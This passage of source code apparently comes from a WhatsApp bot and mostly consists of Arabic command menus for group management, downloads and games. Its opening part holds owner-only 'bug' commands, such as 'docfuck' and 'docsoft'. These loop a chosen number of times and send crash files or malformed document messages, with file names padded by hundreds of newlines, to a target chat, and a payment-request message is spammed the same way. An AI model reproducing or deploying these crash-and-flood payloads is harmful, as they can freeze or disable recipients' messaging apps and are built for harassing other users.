"text": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
}
}}), { userJid: m.chat, quoted: doc})
ElgazarBot.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
reply(`Success in Sending Bug To: ${num}\nAmount Spam: ${jumlah}`)
}
break

case 'docfuck': {

                if (!isCreator) return m.reply(`${mess.owner}`)
if (args.length == 0) return m.reply(`Usage ${prefix+command} amount\nExample ${prefix+command} 5`)
amount = `${encodeURI(q)}`
ydd = `${ownername}`
for (let i = 0; i < amount; i++) {
brutaltarget = fs.readFileSync('./XBug/cumshot.xeon')
ElgazarBot.sendMessage(m.chat, {document: brutaltarget, mimetype: 'application/octet-stream', fileName:`${ownername} ${xeonbutton2}.xeon` }, {quoted:doc})
}
}
break

case 'docsoft': {

                if (!isCreator) return m.reply(`${mess.owner}`)
if (args.length == 0) return m.reply(`Usage ${prefix+command} amount\nExample ${prefix+command} 5`)
amount = `${encodeURI(q)}`
ydd = `${ownername}`
for (let i = 0; i < amount; i++) {
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "${botname}",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `${ownername}\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${xeonbutton2}.xeon`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
}
}), { userJid: m.chat })
ElgazarBot.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
}
break

case 'docsoft2': {

                if (!isCreator) return m.reply(`${mess.owner}`)
                if (args.length == 0) return m.reply(`Usage ${prefix+command} amount\nExample ${prefix+command} 5`)
amount = `${encodeURI(q)}`
ydd = `${ownername}`
for (let i = 0; i < amount; i++) {
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqdSNOaicHcP1vw_2qKlkG3AB8udWmo47Y9rmKjnLUss.enc",
"mimetype": "*/*",
"title": "IMG-20220802-WA0052.jpeg",
"fileSha256": "iKJGFOiAl6DNllhc+9g7t8kwSKTl50TqZaIerGCa1OM=",
"pageCount": 0,
"mediaKey": "inQAnlhVJdu5dMUKr86iWUJnG/umzHeUGrlD7qqAN/I=",
"fileName": `${ownername}\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${xeonbutton2}.jpeg`,
"fileEncSha256": "Ndb8qq5fOJW56Hn8bB3+NNvxfTnZtrVnPM97Ak3ON+c=",
"directPath": "/v/t62.7119-24/30623311_146834807959315_9176799642226465389_n.enc?ccb=11-4&oh=01_AVxHWupe_fRozKysLEUfowD0Z_apYBve1H3C_MGsaD4mCw&oe=630DC76C",
"mediaKeyTimestamp": "1659416157",
}
}), { userJid: m.chat })
ElgazarBot.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
}
break

case 'huehuex': {
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
let user = global.db.data.users[m.sender]
user.afkTime = + new Date
user.afkReason = text
reply(`🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot ${m.pushName} ${text ? ': ' + text : ''}`)
}
break
  case 'not_for_use_xxxxxxxxxxxxwkwkwk':{
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
if (args.length == 0) return reply(`amount?\nExample: ${prefix}charbug 3`)
amount = `${encodeURI(q)}`
for (let i = 0; i < amount; i++) {
let unicornXeonxD = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`, 
"jpegThumbnail": thumb
} 
} 
}
ElgazarBot.sendText(m.chat, `Xeon Ezy☣️`, text, {quoted: unicornXeonxD})
}
}
break
case 'textshot': {
	           	
                if (!isCreator) return m.reply(`${mess.owner}`)
                let user = global.db.data.users[m.sender]
                user.afkTime = + new Date
                user.afkReason = text
                reply(`${m.pushName} Xeon Ezy☣️${text ? ': ' + text : ''}`)
            }
            break
//------------------------The End----------------------\\

/*case 'tqtt': 
throw `Thanks me
https://youtube.com/@YOUSSEF-ALSOLTN


201227179105


YoUsSef Al SoLtAn

https://www.instagram.com/youssef.alsoltan_
`

break*/

case 'م1': case 'اوامر الاعضاء': {
teks = `• مرحبا ياروحي ⤌⤈       
𓆩 *${pushname}* 𓆪
𓍹——————————𓍻
𓆩اليك قائمة باوامر الاعضاء𓆪 
𓍹——————————𓍻
( .السرعه )
♚ لمعرفة معلومات البوت 
ꔹ━━━━━ꔹ
( .التنصيب )
♚ لعرض روابط وصنع بوت مشابه
ꔹ━━━━━ꔹ
( .المطور )
♚ لمعرفه مطور البوت 
ꔹ━━━━━ꔹ
( .انطق )
♚ البوت ينطق المكتوب`
let buttons = [
{buttonId: `owner`, buttonText: {displayText: 'المطور👤'}, type: 1}
]
let buttonMessage = {
image: {url: `https://telegra.ph/file/e6259010eb14f0e5fb98d.jpg`},
jpegThumbnail: log0,
caption: teks,
footer: `${botname}`,
buttons: buttons,
headerType: 4,
contextInfo:{externalAdReply:{
title:"ᴇʟɢᴀᴢᴀʀ ʙᴏт",
body: "سورس الجزار", 
thumbnail: fs.readFileSync("XeonMedia/theme/cheemspic.jpg"),
mediaType:1,
mediaUrl: 'https://telegra.ph/file/e6259010eb14f0e5fb98d.jpg',
sourceUrl: "https://telegra.ph/file/e6259010eb14f0e5fb98d.jpg"
}}
}
ElgazarBot.sendMessage(m.chat, buttonMessage, { quoted: m })
}
            break

case 'م2': case 'اوامر المالك': {
teks = `• مرحبا ياروحي ⤌⤈       
𓆩 *${pushname}* 𓆪
𓍹——————————𓍻
𓆩اليك قائمة باوامر المالك𓆪
𓍹——————————𓍻
( .عام )
♚ يجعل البوت عام للجميع  
ꔹ━━━━━ꔹ
( .خاص )
♚ يجعل البوت خاص للمالك فقط
ꔹ━━━━━ꔹ
( .حظر )
♚ حظر شخص من استخدام البوت 
ꔹ━━━━━ꔹ
( .بان )
♚ حظر اي جروب من استخدام البوت 
ꔹ━━━━━ꔹ
( .اخرج )
♚ خروج البوت من الجروب 
ꔹ━━━━━ꔹ
( .انضم )
♚ ينضم البوت لجروب عبر الرابط
ꔹ━━━━━ꔹ
( .بلوك )
♚ عمل بلوك لشخص من البوت 
ꔹ━━━━━ꔹ
( .فك-البلوك )
♚ الغاء البلوك عن الشخص 
ꔹ━━━━━ꔹ
( .اذاعه )
♚ عمل اذاعه لكل الجروبات في البوت
ꔹ━━━━━ꔹ
( .جلب )
♚ يجلب لك ملفات سكريبت جيثب `
let buttons = [
{buttonId: `owner`, buttonText: {displayText: 'المطور👤'}, type: 1}
]
let buttonMessage = {
image: {url: `https://telegra.ph/file/e6259010eb14f0e5fb98d.jpg`},
jpegThumbnail: log0,
caption: teks,
footer: `${botname}`,
buttons: buttons,
headerType: 4,
contextInfo:{externalAdReply:{
title:"ᴇʟɢᴀᴢᴀʀ ʙᴏт",
body: "سورس الجزار", 
thumbnail: fs.readFileSync("XeonMedia/theme/cheemspic.jpg"),
mediaType:1,
mediaUrl: 'https://telegra.ph/file/e6259010eb14f0e5fb98d.jpg',
sourceUrl: "https://telegra.ph/file/e6259010eb14f0e5fb98d.jpg"
}}
}
ElgazarBot.sendMessage(m.chat, buttonMessage, { quoted: m })
}
            break

case 'م3': case 'اوامر الجروبات': {
teks = `• مرحبا ياروحي ⤌⤈       
𓆩 *${pushname}* 𓆪
𓍹——————————𓍻
𓆩اليك قائمة باوامر الجروب𓆪
𓍹——————————𓍻
( .منشن )
♚ منشن جماعي لكل الاعضاء
ꔹ━━━━━ꔹ
( .مخفي )
♚ منشن مخفي لكل الاعضاء 
ꔹ━━━━━ꔹ
( .حذف )
♚ حذف رسالة البوت والاعضاء
 ꔹ━━━━━ꔹ
( .لينك )
♚ جلب رابط الجروب 
ꔹ━━━━━ꔹ
( .رستر )
♚ رستارت لرابط الجروب 
 ꔹ━━━━━ꔹ
( .رفع )
♚ رفع عضو لمشرف 
 ꔹ━━━━━ꔹ
( .تنزيل )
♚ تنزيل عضو من المشرف 
ꔹ━━━━━ꔹ
( .تغيرالاسم )
♚ تغيير اسم الجروب 
 ꔹ━━━━━ꔹ
( .تغيرالبايو )
♚ تغيير وصف الجروب 
ꔹ━━━━━ꔹ
( .تغيرالصوره )
♚ تغيير صورة الجروب 
ꔹ━━━━━ꔹ
( .جروب )
♚ غلق وفتح الجروب 
 ꔹ━━━━━ꔹ
( .طرد )
♚ طرد شخص من الجروب 
 ꔹ━━━━━ꔹ
( . اضافه )
♚ اضافه شخص للجروب
ꔹ━━━━━ꔹ
( .الروابط )
♚ منع ارسال الروابط في الجروب 
ꔹ━━━━━ꔹ
( .السب )
♚ لمنع الشتايم والسب في الجروبات
ꔹ━━━━━ꔹ
( .الحب )
♚ جلب نسبه حب الشخص لك
ꔹ━━━━━ꔹ
( .الكره )
♚ نسبه كره الشخص لك
ꔹ━━━━━ꔹ
( .شخصيتك )
♚ البوت يعرفك شخصيتك
ꔹ━━━━━ꔹ
( .الجمال )
♚ يجلب لك نسبه جمالك`
let buttons = [
{buttonId: `owner`, buttonText: {displayText: 'المطور👤'}, type: 1}
]
let buttonMessage = {
image: {url: `https://telegra.ph/file/e6259010eb14f0e5fb98d.jpg`},
jpegThumbnail: log0,
caption: teks,
footer: `${botname}`,
buttons: buttons,
headerType: 4,
contextInfo:{externalAdReply:{
title:"ᴇʟɢᴀᴢᴀʀ ʙᴏт",
body: "سورس الجزار", 
thumbnail: fs.readFileSync("XeonMedia/theme/cheemspic.jpg"),
mediaType:1,
mediaUrl: 'https://telegra.ph/file/e6259010eb14f0e5fb98d.jpg',
sourceUrl: "https://telegra.ph/file/e6259010eb14f0e5fb98d.jpg"
}}
}
ElgazarBot.sendMessage(m.chat, buttonMessage, { quoted: m })
}
            break

case 'م4': case 'اوامر التنزيل': {
teks = `• مرحبا ياروحي ⤌⤈       
𓆩 *${pushname}* 𓆪
𓍹——————————𓍻
𓆩اليك قائمة باوامر التنزيل𓆪
𓍹——————————𓍻
( .ميديافاير )
♚ التنزيل من ميديا فاير
 ꔹ━━━━━ꔹ
( .انستجرام )
♚ التنزيل من انستجرام
 ꔹ━━━━━ꔹ
( .تيكتوك )
♚ التنزيل من تيكتوك 
ꔹ━━━━━ꔹ
( .شغل )
♚ البحث عن مقطع أغنية في يوتيوب
 ꔹ━━━━━ꔹ
 ( .تشغيل )
♚ قائمه بحث علي اغاني في يوتيوب
 ꔹ━━━━━ꔹ
( .انمي )
♚ البحث عن خلفية انمي 
 ꔹ━━━━━ꔹ
( .صوره )
♚ البحث عن صور عشوائية 
ꔹ━━━━━ꔹ
( .تطقيم )
♚ جلب تطقيمات 
 ꔹ━━━━━ꔹ
( .فيديو )
♚ تنزيل فيديو من يوتيوب بالرابط
 ꔹ━━━━━ꔹ
 ( .اغنيه )
♚ تنزيل اغنيه من يوتيوب بالرابط
 ꔹ━━━━━ꔹ
 ( .خلفيات )
♚ تنزيل خلفيات
 ꔹ━━━━━ꔹ
 ( .ويلبر )
♚ تنزيل صور ويلبر للتليفون
 ꔹ━━━━━ꔹ
( .تخمين )
♚ تخمين ارقام مشابهه لرقمك`
let buttons = [
{buttonId: `owner`, buttonText: {displayText: 'المطور👤'}, type: 1}
]
let buttonMessage = {
image: {url: `https://telegra.ph/file/e6259010eb14f0e5fb98d.jpg`},
jpegThumbnail: log0,
caption: teks,
footer: `${botname}`,
buttons: buttons,
headerType: 4,
contextInfo:{externalAdReply:{
title:"ᴇʟɢᴀᴢᴀʀ ʙᴏт",
body: "سورس الجزار", 
thumbnail: fs.readFileSync("XeonMedia/theme/cheemspic.jpg"),
mediaType:1,
mediaUrl: 'https://telegra.ph/file/e6259010eb14f0e5fb98d.jpg',
sourceUrl: "https://telegra.ph/file/e6259010eb14f0e5fb98d.jpg"
}}
}
ElgazarBot.sendMessage(m.chat, buttonMessage, { quoted: m })
}
            break

case 'م5': case 'اوامر التحويل': {
teks = `• مرحبا ياروحي ⤌⤈       
𓆩 *${pushname}* 𓆪
𓍹——————————𓍻
𓆩اليك قائمة باوامر التحويل𓆪
𓍹——————————𓍻
( .مـلـصـق )
♚ انشاء ملصقات عادية ومتحركة 
 ꔹ━━━━━ꔹ
( .سرقه )
♚ انشاء ملصق بحقوقك 
 ꔹ━━━━━ꔹ
( .دمج )
♚ دمج اثنين من الاموجي 
ꔹ━━━━━ꔹ
( .لصورة )
♚ تحويل ملصق عادي لصورة 
 ꔹ━━━━━ꔹ
( .لفيديو )
♚ تحويل ملصق متحرك لفيديو 
 ꔹ━━━━━ꔹ
( .لصوتي )
♚ تحويل فيديو لصوتية 
 ꔹ━━━━━ꔹ
( .لمتحرك )
♚ تحويل ملصق لمتحرك
 ꔹ━━━━━ꔹ
 ( .اظبطها )
♚ لحذف خلفيه الصور
ꔹ━━━━━ꔹ
 ( .ايموجي )
♚ تحويل ايموجي لصوره
 ꔹ━━━━━ꔹ
 ( .تقصير )
♚ تقصير الروابط وجعلها قصيره
 ꔹ━━━━━ꔹ
( .اكتب )
♚ يكتب لك علي الملصق`
let buttons = [
{buttonId: `owner`, buttonText: {displayText: 'المطور👤'}, type: 1}
]
let buttonMessage = {
image: {url: `https://telegra.ph/file/e6259010eb14f0e5fb98d.jpg`},
jpegThumbnail: log0,
caption: teks,
footer: `${botname}`,
buttons: buttons,
headerType: 4,
contextInfo:{externalAdReply:{
title:"ᴇʟɢᴀᴢᴀʀ ʙᴏт",
body: "سورس الجزار", 
thumbnail: fs.readFileSync("XeonMedia/theme/cheemspic.jpg"),
mediaType:1,
mediaUrl: 'https://telegra.ph/file/e6259010eb14f0e5fb98d.jpg',
sourceUrl: "https://telegra.ph/file/e6259010eb14f0e5fb98d.jpg"
}}
}
ElgazarBot.sendMessage(m.chat, buttonMessage, { quoted: m })
}
            break

case 'م6': case 'اوامر تغير الصوت': {
teks = `• مرحبا ياروحي ⤌⤈       
𓆩 *${pushname}* 𓆪
𓍹——————————𓍻
𓆩اليك قائمة باوامر تغير الصوت𓆪
𓍹——————————𓍻
( .دبه )
♚ عمل دبه لصوت الاغنيه
ꔹ━━━━━ꔹ
( .ضوضاء )
♚ عمل ضوضاء لصوت الاغنيه
 ꔹ━━━━━ꔹ
( .بطئ )
♚ عمل تبطئ لصوت الاغنيه
 ꔹ━━━━━ꔹ
( .بطئ2 )
♚ عمل تبطئ لصوت الاغنيه
ꔹ━━━━━ꔹ
( .سريع )
♚ عمل تسريع لصوت الاغنيه
 ꔹ━━━━━ꔹ
( .طفل )
♚ عمل الاغنيه بصوت طفل
 ꔹ━━━━━ꔹ
( .عكس )
♚ عمل عكس لاغنيه 
ꔹ━━━━━ꔹ
( .روبوت )
♚ عمل الاغنيه بصوت روبوت`
let buttons = [
{buttonId: `owner`, buttonText: {displayText: 'المطور👤'}, type: 1}
]
let buttonMessage = {
image: {url: `https://telegra.ph/file/e6259010eb14f0e5fb98d.jpg`},
jpegThumbnail: log0,
caption: teks,
footer: `${botname}`,
buttons: buttons,
headerType: 4,
contextInfo:{externalAdReply:{
title:"ᴇʟɢᴀᴢᴀʀ ʙᴏт",
body: "سورس الجزار", 
thumbnail: fs.readFileSync("XeonMedia/theme/cheemspic.jpg"),
mediaType:1,
mediaUrl: 'https://telegra.ph/file/e6259010eb14f0e5fb98d.jpg',
sourceUrl: "https://telegra.ph/file/e6259010eb14f0e5fb98d.jpg"
}}
}
ElgazarBot.sendMessage(m.chat, buttonMessage, { quoted: m })
}
            break

case 'م7': case 'اوامر التسليه': {
teks = `• مرحبا ياروحي ⤌⤈       
𓆩 *${pushname}* 𓆪
𓍹——————————𓍻
𓆩اليك قائمة باوامر التسليه𓆪
𓍹——————————𓍻
( .اكس )
♚ لعبه اكس او
 ꔹ━━━━━ꔹ
 ( .مغادره )
♚ مغادره الجيم في اكس او
 ꔹ━━━━━ꔹ
 ( .الفاكهه )
♚ لعبه الفاكهه
 ꔹ━━━━━ꔹ
( .زواج )
♚ البوت يزوج اثنين عشوائي
 ꔹ━━━━━ꔹ
 ( .طلاق )
♚ البوت يطلق اثنين عشوائي
 ꔹ━━━━━ꔹ
 ( .زوجني )
♚ البوت يزوجك من شخص عشوائي
 ꔹ━━━━━ꔹ
 ( .طلقني )
♚ البوت يطلقك من شخص عشوائي
 ꔹ━━━━━ꔹ
( .رفيق )
♚ البوت يجيب لك رفيق عشوائي
 ꔹ━━━━━ꔹ
 ( .فراق )
♚ البوت يفارقك من رفيقك
 ꔹ━━━━━ꔹ
( .عكس )
♚ عكس كلمة او جملة 
ꔹ━━━━━ꔹ
( .اختفاء )
♚ اترك سبب ذهابك
ꔹ━━━━━ꔹ
( .لولي )
♚ صوره عشوائيه لـ لولي
 ꔹ━━━━━ꔹ
( .نيكو )
♚ صوره عشوائيه لـ نيكو
 ꔹ━━━━━ꔹ
( .فيد )
♚ صوره عشوائيه لـ فيد
ꔹ━━━━━ꔹ
( .انمي )
♚ صوره عشوائيه لـ انمي
 ꔹ━━━━━ꔹ
( .قهوه )
♚ صوره عشوائيه لـ قهوه
 ꔹ━━━━━ꔹ
(. وايفي2 )
♚ صوره عشوائيه لـ وايفي2
ꔹ━━━━━ꔹ
( .نيكو2 )
♚ صوره عشوائيه لـ نيكو2
 ꔹ━━━━━ꔹ
 ( .نوم )
♚ صوره عشوائيه لـ نوم
 ꔹ━━━━━ꔹ
( .مانجا )
♚ صوره عشوائيه لـ مانجا`
let buttons = [
{buttonId: `owner`, buttonText: {displayText: 'المطور👤'}, type: 1}
]
let buttonMessage = {
image: {url: `https://telegra.ph/file/e6259010eb14f0e5fb98d.jpg`},
jpegThumbnail: log0,
caption: teks,
footer: `${botname}`,
buttons: buttons,
headerType: 4,
contextInfo:{externalAdReply:{
title:"ᴇʟɢᴀᴢᴀʀ ʙᴏт",
body: "سورس الجزار", 
thumbnail: fs.readFileSync("XeonMedia/theme/cheemspic.jpg"),
mediaType:1,
mediaUrl: 'https://telegra.ph/file/e6259010eb14f0e5fb98d.jpg',
sourceUrl: "https://telegra.ph/file/e6259010eb14f0e5fb98d.jpg"
}}
}
ElgazarBot.sendMessage(m.chat, buttonMessage, { quoted: m })
}
            break


case 'مميزات': case 'المميزات': {
teks = `• مرحبا ياروحي ⤌⤈       
𓆩 *${pushname}* 𓆪
𓍹——————————𓍻
𓆩اليك قائمة بمميزات البوت𓆪 
𓍹——————————𓍻
( .اذكار )
♚ البوت يرسل لك اذكار عشوائيه
ꔹ━━━━━ꔹ
( .تويت )
♚ البوت يسالك اساله حياتيه
ꔹ━━━━━ꔹ
( .انصح )
♚ البوت يبعتلك نصايح عشوائيه
ꔹ━━━━━ꔹ
( .صراحه )
♚ البوت يبعتلك اسئله صراحه
ꔹ━━━━━ꔹ
( .اسال )
♚ البوت يسالك ونت جاوب
ꔹ━━━━━ꔹ
( .خيروك )
♚ البوت يخيرك بين حاجتين
ꔹ━━━━━ꔹ
( .كت )
♚ البوت يجيب اسماء انمي
ꔹ━━━━━ꔹ
( .بوست )
♚ البوت يرسلك لك بوست عشوائي
ꔹ━━━━━ꔹ
( .حروف )
♚ البوت يرسلك حروف تكملها
ꔹ━━━━━ꔹ`
let buttons = [
{buttonId: `owner`, buttonText: {displayText: 'المطور👤'}, type: 1}
]
let buttonMessage = {
image: {url: `https://telegra.ph/file/e6259010eb14f0e5fb98d.jpg`},
jpegThumbnail: log0,
caption: teks,
footer: `${botname}`,
buttons: buttons,
headerType: 4,
contextInfo:{externalAdReply:{
title:"ᴇʟɢᴀᴢᴀʀ ʙᴏт",
body: "سورس الجزار", 
thumbnail: fs.readFileSync("XeonMedia/theme/cheemspic.jpg"),
mediaType:1,
mediaUrl: 'https://telegra.ph/file/e6259010eb14f0e5fb98d.jpg',
sourceUrl: "https://telegra.ph/file/e6259010eb14f0e5fb98d.jpg"
}}
}
ElgazarBot.sendMessage(m.chat, buttonMessage, { quoted: m })
}
            break

case 'م8': case 'كل الاوامر': {
teks = `• مرحبا ياروحي ⤌⤈       
𓆩 *${pushname}* 𓆪
• انا بوت واتس اسمي ⤌⤈
𓆩 *${global.BotName}* 𓆪
• اعمل في الخاص وجروبات •
• وظيفتي حماية جروبك •
• تفضل اوامر البوت •
𓍹——————————𓍻
𓆩اليك قائمة باوامر الاعضاء𓆪 
𓍹——————————𓍻
( .السرعه )
♚ لمعرفة معلومات البوت 
ꔹ━━━━━ꔹ
( .التنصيب )
♚ لعرض روابط وصنع بوت مشابه
ꔹ━━━━━ꔹ
( .المطور )
♚ لمعرفه مطور البوت 
ꔹ━━━━━ꔹ
( .انطق )
𓍹——————————𓍻
𓆩اليك قائمة باوامر المالك𓆪
𓍹——————————𓍻
( .عام )
♚ يجعل البوت عام للجميع  
ꔹ━━━━━ꔹ
( .خاص )
♚ يجعل البوت خاص للمالك فقط
ꔹ━━━━━ꔹ
( .اخرج )
♚ خروج البوت من الجروب 
ꔹ━━━━━ꔹ
( .انضم )
♚ ينضم البوت لجروب عبر الرابط
ꔹ━━━━━ꔹ
( .بلوك )
♚ عمل بلوك لشخص من البوت 
ꔹ━━━━━ꔹ
( .فك-البلوك )
♚ الغاء البلوك عن الشخص 
ꔹ━━━━━ꔹ
( .مميز )
♚ جعل شخص مميز بالبوت
ꔹ━━━━━ꔹ
( .عادي )
♚ جعل شخص عادي بالبوت وغير مميز
ꔹ━━━━━ꔹ
( .اذاعه )
♚ عمل اذاعه لكل الجروبات في البوت
ꔹ━━━━━ꔹ
( .جلب )
♚ يجلب لك ملفات سكريبت جيثب 
𓍹——————————𓍻
𓆩اليك قائمة باوامر الجروب𓆪
𓍹——————————𓍻
( .منشن )
♚ منشن جماعي لكل الاعضاء
ꔹ━━━━━ꔹ
( .مخفي )
♚ منشن مخفي لكل الاعضاء 
ꔹ━━━━━ꔹ
( .المتصلين )
♚ يجيب لك الاعضاء المتصله
 ꔹ━━━━━ꔹ
( .حذف )
♚ حذف رسالة البوت والاعضاء
 ꔹ━━━━━ꔹ
( .لينك )
♚ جلب رابط الجروب 
ꔹ━━━━━ꔹ
( .رستر )
♚ رستارت لرابط الجروب 
 ꔹ━━━━━ꔹ
( .رفع )
♚ رفع عضو لمشرف 
 ꔹ━━━━━ꔹ
( .تنزيل )
♚ تنزيل عضو من المشرف 
ꔹ━━━━━ꔹ
( .تغيرالاسم )
♚ تغيير اسم الجروب 
 ꔹ━━━━━ꔹ
( .تغيرالبايو )
♚ تغيير وصف الجروب 
ꔹ━━━━━ꔹ
( .تغيرالصوره )
♚ تغيير صورة الجروب 
ꔹ━━━━━ꔹ
( .جروب )
♚ غلق وفتح الجروب 
 ꔹ━━━━━ꔹ
( .طرد )
♚ طرد شخص من الجروب 
 ꔹ━━━━━ꔹ
( . اضافه )
♚ اضافه شخص للجروب
ꔹ━━━━━ꔹ
( .الروابط )
♚ منع ارسال الروابط في الجروب
ꔹ━━━━━ꔹ
( .السب )
♚ لمنع الشتايم والسب في الجروبات
ꔹ━━━━━ꔹ
( .الحب )
♚ جلب نسبه حب الشخص لك
ꔹ━━━━━ꔹ
( .الكره )
♚ نسبه كره الشخص لك
ꔹ━━━━━ꔹ
( .شخصيتك )
♚ البوت يعرفك شخصيتك
ꔹ━━━━━ꔹ
( .الجمال )
♚ يجلب لك نسبه جمالك
𓍹——————————𓍻
𓆩اليك قائمة باوامر التنزيل𓆪
𓍹——————————𓍻
( .ميديافاير )
♚ التنزيل من ميديا فاير
 ꔹ━━━━━ꔹ
( .انستجرام )
♚ التنزيل من انستجرام
 ꔹ━━━━━ꔹ
( .تيكتوك )
♚ التنزيل من تيكتوك 
ꔹ━━━━━ꔹ
( .شغل )
♚ البحث عن مقطع أغنية في يوتيوب
 ꔹ━━━━━ꔹ
 ( .تشغيل )
♚ قائمه بحث علي اغاني في يوتيوب
 ꔹ━━━━━ꔹ
( .انمي )
♚ البحث عن خلفية انمي 
 ꔹ━━━━━ꔹ
( .صوره )
♚ البحث عن صور عشوائية 
ꔹ━━━━━ꔹ
( .تطقيم )
♚ جلب تطقيمات 
 ꔹ━━━━━ꔹ
( .فيديو )
♚ تنزيل فيديو من يوتيوب بالرابط
 ꔹ━━━━━ꔹ
 ( .اغنيه )
♚ تنزيل اغنيه من يوتيوب بالرابط
 ꔹ━━━━━ꔹ
 ( .خلفيات )
♚ تنزيل خلفيات
 ꔹ━━━━━ꔹ
 ( .ويلبر )
♚ تنزيل صور ويلبر للتليفون
 ꔹ━━━━━ꔹ
( .تخمين )
♚ تخمين ارقام مشابهه لرقمك
𓍹——————————𓍻
𓆩اليك قائمة باوامر التحويل𓆪
𓍹——————————𓍻
( .مـلـصـق )
♚ انشاء ملصقات عادية ومتحركة 
 ꔹ━━━━━ꔹ
( .سرقه )
♚ انشاء ملصق بحقوقك 
 ꔹ━━━━━ꔹ
( .دمج )
♚ دمج اثنين من الاموجي 
ꔹ━━━━━ꔹ
( .لصورة )
♚ تحويل ملصق عادي لصورة 
 ꔹ━━━━━ꔹ
